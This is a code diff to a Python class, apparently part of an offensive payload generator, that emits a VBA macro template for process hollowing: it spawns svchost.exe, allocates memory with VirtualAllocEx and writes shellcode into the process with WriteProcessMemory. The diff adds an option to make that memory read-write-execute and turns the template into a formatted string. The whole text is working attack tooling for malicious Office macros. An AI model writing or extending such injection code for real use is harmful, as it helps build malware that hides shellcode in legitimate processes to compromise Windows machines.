@@ -1,4 +1,10 @@
 class spawnandinject:
+    def __init__(self, arguments):
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = '&H40'
+            else:
+                self.memoryPermission = '&H20'
 
     def imports(self) -> list[str]:
         return ['Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr',
@@ -11,8 +17,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self) -> str:
-        return """
+    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
+        return f"""
 {imports}
 
 Private Type PROCESS_BASIC_INFORMATION
@@ -88,7 +94,7 @@ Function hollow()
 
     Dim addr as LongPtr
 
-    addr = VirtualAllocEx(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, &H20)
+    addr = VirtualAllocEx(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, {self.memoryPermission})
 
     ' Write the shellcode into the svchost.exe entry point
     a = WriteProcessMemory(pi.hProcess, addr, buf(0), scSize, tmp)
